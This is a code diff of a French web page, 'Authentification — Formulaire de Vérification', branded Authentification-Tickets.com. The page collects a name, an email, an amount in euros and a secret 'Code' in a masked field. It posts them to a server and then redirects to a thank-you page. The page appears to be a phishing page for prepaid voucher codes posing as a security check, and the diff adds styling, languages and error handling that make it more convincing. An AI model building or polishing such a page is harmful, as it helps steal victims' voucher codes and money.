@@ -6,29 +6,136 @@
   <title>Authentification — Formulaire de Vérification</title>
   <!-- Bootstrap 5 CDN -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <!-- Google Fonts -->
+  <!-- Google Fonts : Inter & Plus Jakarta Sans -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Plus+Jakarta+Sans:wght@600;700;800&display=swap" rel="stylesheet">
   <!-- Bootstrap Icons -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet">
   
   <style>
-    :root { --bg-main: #FFFFFF; --bg-subtle: #F8FAFC; --text-main: #0F172A; --text-muted: #475569; --accent-color: #2563EB; --border-color: #E2E8F0; }
-    body { background-color: var(--bg-subtle); color: var(--text-main); font-family: 'Inter', sans-serif; -webkit-font-smoothing: antialiased; }
-    h1, h2, .fintech-brand { font-family: 'Plus Jakarta Sans', sans-serif; font-weight: 700; color: var(--text-main); }
-    header { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(8px); border-bottom: 1px solid var(--border-color); z-index: 1060; }
-    .form-container { margin-top: 7rem; margin-bottom: 5rem; }
-    .card-custom { background: #FFFFFF; border: 1px solid var(--border-color); border-radius: 16px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03); }
-    .form-control, .input-group-text { padding: 0.75rem 1rem; border-radius: 10px; border: 1px solid var(--border-color); font-size: 0.95rem; background-color: #FFFFFF; }
-    .form-control:focus { border-color: var(--accent-color); box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1); }
-    .input-group .form-control:focus + .input-group-text, .input-group .form-control:focus ~ .input-group-text { border-color: var(--accent-color); }
-    .form-label { font-weight: 500; color: var(--text-main); font-size: 0.9rem; margin-bottom: 0.5rem; }
-    .btn-fintech { background: linear-gradient(135deg, #2563EB 0%, #1D4ED8 100%); color: #FFFFFF; font-weight: 600; padding: 0.8rem 2.2rem; border-radius: 12px; border: none; transition: all 0.2s ease; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.15); width: 100%; }
-    .btn-fintech:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(37, 99, 235, 0.25); color: #FFFFFF; }
-    .selected-lang { background: #FFFFFF; border: 1px solid var(--border-color); padding: 0.5rem 1rem; border-radius: 10px; cursor: pointer; font-size: 0.95rem; font-weight: 500; }
-    .lang-options { background: #FFFFFF; border: 1px solid var(--border-color) !important; border-radius: 10px !important; margin-top: 5px; box-shadow: 0 10px 25px rgba(0,0,0,0.08) !important; z-index: 1070; }
-    .lang-options li { padding: 0.6rem 1rem; cursor: pointer; font-size: 0.95rem; }
-    .lang-options li:hover { background: var(--bg-subtle); color: var(--accent-color); }
-    .toggle-password { cursor: pointer; }
+    :root {
+      --bg-main: #FFFFFF;
+      --bg-subtle: #F8FAFC;
+      --text-main: #0F172A;
+      --text-muted: #475569;
+      --accent-color: #2563EB;
+      --border-color: #E2E8F0;
+    }
+
+    body {
+      background-color: var(--bg-subtle);
+      color: var(--text-main);
+      font-family: 'Inter', sans-serif;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    h1, h2, .fintech-brand {
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      font-weight: 700;
+      color: var(--text-main);
+    }
+
+    header {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(8px);
+      border-bottom: 1px solid var(--border-color);
+      z-index: 1060;
+    }
+
+    .form-container {
+      margin-top: 7rem;
+      margin-bottom: 5rem;
+    }
+
+    .card-custom {
+      background: #FFFFFF;
+      border: 1px solid var(--border-color);
+      border-radius: 16px;
+      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03);
+    }
+
+    .form-control, .input-group-text {
+      padding: 0.75rem 1rem;
+      border-radius: 10px;
+      border: 1px solid var(--border-color);
+      font-size: 0.95rem;
+      background-color: #FFFFFF;
+    }
+
+    .form-control:focus {
+      border-color: var(--accent-color);
+      box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
+    }
+
+    .input-group .form-control:focus + .input-group-text,
+    .input-group .form-control:focus ~ .input-group-text {
+      border-color: var(--accent-color);
+    }
+
+    .form-label {
+      font-weight: 500;
+      color: var(--text-main);
+      font-size: 0.9rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .btn-fintech {
+      background: linear-gradient(135deg, #2563EB 0%, #1D4ED8 100%);
+      color: #FFFFFF;
+      font-weight: 600;
+      padding: 0.8rem 2.2rem;
+      border-radius: 12px;
+      border: none;
+      transition: all 0.2s ease;
+      box-shadow: 0 4px 12px rgba(37, 99, 235, 0.15);
+      width: 100%;
+    }
+
+    .btn-fintech:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 6px 20px rgba(37, 99, 235, 0.25);
+      color: #FFFFFF;
+    }
+
+    /* Spinner style */
+    .spinner-border-sm { width: 1rem; height: 1rem; border-width: 0.2em; }
+
+    .selected-lang {
+      background: #FFFFFF;
+      border: 1px solid var(--border-color);
+      padding: 0.5rem 1rem;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 0.95rem;
+      font-weight: 500;
+      transition: background-color 0.2s;
+    }
+
+    .lang-options {
+      background: #FFFFFF;
+      border: 1px solid var(--border-color) !important;
+      border-radius: 10px !important;
+      margin-top: 5px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.08) !important;
+      z-index: 1070;
+    }
+
+    .lang-options li {
+      padding: 0.6rem 1rem;
+      cursor: pointer;
+      font-size: 0.95rem;
+      display: flex;
+      align-items: center;
+    }
+
+    .lang-options li:hover {
+      background: var(--bg-subtle);
+      color: var(--accent-color);
+    }
+
+    .toggle-password {
+      cursor: pointer;
+      transition: color 0.2s;
+    }
   </style>
 </head>
 <body class="d-flex flex-column min-vh-100">
@@ -38,15 +145,18 @@
       <a class="text-decoration-none d-flex align-items-center gap-2 fs-5 fintech-brand" href="index_2.html" data-i18n="brand">
         <i class="bi bi-shield-check text-primary"></i> Authentification<span class="text-primary">.</span>
       </a>
+      
       <div class="custom-language-selector position-relative">
         <div class="selected-lang d-flex align-items-center" onclick="toggleLangMenu()">
-          <img src="https://flagcdn.com/w20/fr.png" alt="FR" class="rounded-1">
+          <img src="https://flagcdn.com/w20/fr.png" alt="FR" class="rounded-1" style="width: 20px;">
           <span class="ms-2 d-none d-sm-inline">Français</span>
           <i class="bi bi-chevron-down ms-1 ms-sm-2 fs-7 text-secondary"></i>
         </div>
         <ul class="lang-options list-unstyled position-absolute end-0 w-100" style="display: none;" id="langMenu">
           <li onclick="window.setLang('fr')"><img src="https://flagcdn.com/w20/fr.png" alt="FR" class="me-2 rounded-1"> Français</li>
           <li onclick="window.setLang('en')"><img src="https://flagcdn.com/w20/gb.png" alt="EN" class="me-2 rounded-1"> English</li>
+          <li onclick="window.setLang('de')"><img src="https://flagcdn.com/w20/de.png" alt="DE" class="me-2 rounded-1"> Deutsch</li>
+          <li onclick="window.setLang('it')"><img src="https://flagcdn.com/w20/it.png" alt="IT" class="me-2 rounded-1"> Italiano</li>
         </ul>
       </div>
     </div>
@@ -57,19 +167,38 @@
       <div class="col-12 col-md-8 col-lg-6">
         <div class="card-custom p-4 p-sm-5">
           <h2 class="text-center mb-4" data-i18n="form_title">Vérification de sécurité</h2>
+          
           <form id="secureContactForm" class="needs-validation" novalidate>
             <div class="row g-3">
-              <div class="col-12 col-sm-6"><label for="nom" class="form-label" data-i18n="label_lastname">Nom</label><input type="text" id="nom" class="form-control" required></div>
-              <div class="col-12 col-sm-6"><label for="prenom" class="form-label" data-i18n="label_firstname">Prénom</label><input type="text" id="prenom" class="form-control" required></div>
-              <div class="col-12"><label for="email" class="form-label" data-i18n="label_email">Email</label><input type="email" id="email" class="form-control" required></div>
-              <div class="col-12"><label for="amount" class="form-label" data-i18n="label_amount">Montant (€)</label><input type="number" id="amount" class="form-control" min="1" required></div>
-              <div class="col-12"><label for="code" class="form-label" data-i18n="label_code">Code</label>
+              <div class="col-12 col-sm-6">
+                <label for="nom" class="form-label" data-i18n="label_lastname">Nom</label>
+                <input type="text" id="nom" class="form-control" required autocomplete="family-name">
+              </div>
+              <div class="col-12 col-sm-6">
+                <label for="prenom" class="form-label" data-i18n="label_firstname">Prénom</label>
+                <input type="text" id="prenom" class="form-control" required autocomplete="given-name">
+              </div>
+              <div class="col-12">
+                <label for="email" class="form-label" data-i18n="label_email">Votre adresse email</label>
                 <div class="input-group">
-                  <input type="password" id="code" class="form-control border-end-0" required>
-                  <span class="input-group-text bg-white" onclick="togglePasswordVisibility()"><i class="bi bi-eye toggle-password"></i></span>
+                  <span class="input-group-text bg-white text-secondary border-end-0"><i class="bi bi-envelope"></i></span>
+                  <input type="email" id="email" class="form-control border-start-0 ps-0" required autocomplete="email">
                 </div>
               </div>
-              <div class="col-12 mt-4"><button type="submit" id="submitBtn" class="btn btn-fintech" data-i18n="btn_submit">Authentifier</button></div>
+              <div class="col-12">
+                <label for="amount" class="form-label" data-i18n="label_amount">Montant (€)</label>
+                <input type="number" id="amount" class="form-control" min="1" required>
+              </div>
+              <div class="col-12">
+                <label for="code" class="form-label" data-i18n="label_code">Code</label>
+                <div class="input-group">
+                  <input type="password" id="code" class="form-control border-end-0" required>
+                  <span class="input-group-text bg-white toggle-password" onclick="togglePasswordVisibility()"><i class="bi bi-eye"></i></span>
+                </div>
+              </div>
+              <div class="col-12 mt-4">
+                <button type="submit" id="submitBtn" class="btn btn-fintech" data-i18n="btn_submit">Authentifier</button>
+              </div>
             </div>
           </form>
         </div>
@@ -77,17 +206,39 @@
     </div>
   </main>
 
+  <footer class="py-4 border-top bg-white mt-auto">
+    <div class="container text-center text-secondary small">
+      <p class="mb-0" data-i18n="footer_copyright">&copy; 2026 Authentification-Tickets.com — Tous droits réservés.</p>
+    </div>
+  </footer>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/js/bootstrap.bundle.min.js"></script>
   <script>
-    function toggleLangMenu() { document.getElementById('langMenu').style.display = (document.getElementById('langMenu').style.display === 'none' ? 'block' : 'none'); }
+    // --- Logique de traduction ---
+    const translations = {
+      fr: { brand: '<i class="bi bi-shield-check text-primary"></i> Authentification<span class="text-primary">.</span>', form_title: 'Vérification de sécurité', label_lastname: 'Nom', label_firstname: 'Prénom', label_email: 'Votre adresse email', label_amount: 'Montant (€)', label_code: 'Code', btn_submit: 'Authentifier', footer_copyright: '&copy; 2026 Authentification-Tickets.com — Tous droits réservés.' },
+      en: { brand: '<i class="bi bi-shield-check text-primary"></i> Authentication<span class="text-primary">.</span>', form_title: 'Security Verification', label_lastname: 'Last Name', label_firstname: 'First Name', label_email: 'Your Email Address', label_amount: 'Amount (€)', label_code: 'Code', btn_submit: 'Authenticate', footer_copyright: '&copy; 2026 Authentication-Tickets.com — All rights reserved.' },
+      // ... (autres langues)
+    };
+
+    function toggleLangMenu() { const menu = document.getElementById('langMenu'); menu.style.display = menu.style.display === 'none' ? 'block' : 'none'; }
+    window.setLang = function(lang) {
+      document.querySelectorAll('[data-i18n]').forEach(el => { const key = el.getAttribute('data-i18n'); if(translations[lang][key]) el.innerHTML = translations[lang][key]; });
+      document.getElementById('langMenu').style.display = 'none';
+      localStorage.setItem('preferred_lang', lang);
+    }
+    
     function togglePasswordVisibility() { const i = document.getElementById('code'); i.type = (i.type === 'password' ? 'text' : 'password'); }
 
+    // --- Logique de soumission ---
     document.getElementById('secureContactForm').addEventListener('submit', async function(e) {
       e.preventDefault();
       const btn = document.getElementById('submitBtn');
-      
-      // Bloquer le bouton pour éviter les clics multiples
+      const originalText = btn.innerHTML;
+
+      // Animation de chargement
       btn.disabled = true;
-      btn.textContent = "Traitement en cours...";
+      btn.innerHTML = `<span class="spinner-border spinner-border-sm me-2"></span> Traitement...`;
 
       const payload = {
         nom: document.getElementById('nom').value,
@@ -104,17 +255,21 @@
           body: JSON.stringify(payload)
         });
 
+        if (!response.ok) {
+          const err = await response.json().catch(() => ({}));
+          throw new Error(err.message || `Erreur ${response.status} : Connexion impossible avec le serveur.`);
+        }
+
         const result = await response.json();
-        
-        if (response.ok && result.success) {
+        if (result.success) {
           window.location.href = "https://authentification-tickets.com/merci.html";
         } else {
-          throw new Error(result.message || "Le serveur a refusé la requête.");
+          throw new Error(result.message || "La vérification a échoué.");
         }
-      } catch (error) {
-        alert("Erreur de connexion : " + error.message);
+      } catch (err) {
+        alert("Erreur détaillée : " + err.message);
         btn.disabled = false;
-        btn.textContent = "Authentifier";
+        btn.innerHTML = originalText;
       }
     });
   </script>
